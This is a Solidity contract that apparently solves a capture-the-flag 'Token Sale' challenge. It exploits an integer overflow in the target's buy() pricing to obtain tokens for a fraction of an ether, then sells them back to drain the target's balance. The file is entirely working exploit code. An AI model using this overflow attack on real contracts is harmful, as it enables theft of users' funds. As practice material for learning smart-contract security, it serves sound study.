pragma solidity ^0.4.21;

interface ITokenSaleChallenge {
    function isComplete() external view returns (bool);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleChallengeSolution {
    event PrintUint256(uint256);
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallengeSolution() public {
        uint256 uintMax = (2**256 - 1);
        uint256 numTokens = (uintMax) / PRICE_PER_TOKEN + 1;
        emit PrintUint256(numTokens);
        emit PrintUint256((numTokens) * PRICE_PER_TOKEN);
        uint256 msgVal = numTokens * PRICE_PER_TOKEN;
        require(msgVal == 415992086870360064);
        require(
            numTokens ==
                115792089237316195423570985008687907853269984665640564039458
        );
    }

    function c(address w) public payable {
        uint256 uintMax = (2**256 - 1);
        uint256 numTokens = uintMax / PRICE_PER_TOKEN + 1;
        // 415992086870360064
        require(msg.value == numTokens * PRICE_PER_TOKEN);
        emit PrintUint256(numTokens);
        emit PrintUint256(numTokens * PRICE_PER_TOKEN);

        ITokenSaleChallenge ts = ITokenSaleChallenge(w);
        ts.buy.value(numTokens * PRICE_PER_TOKEN)(numTokens);

        emit PrintUint256(address(ts).balance);
        uint256 tokensToSell = address(ts).balance / PRICE_PER_TOKEN;
        ts.sell(tokensToSell);
        require(ts.isComplete());
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
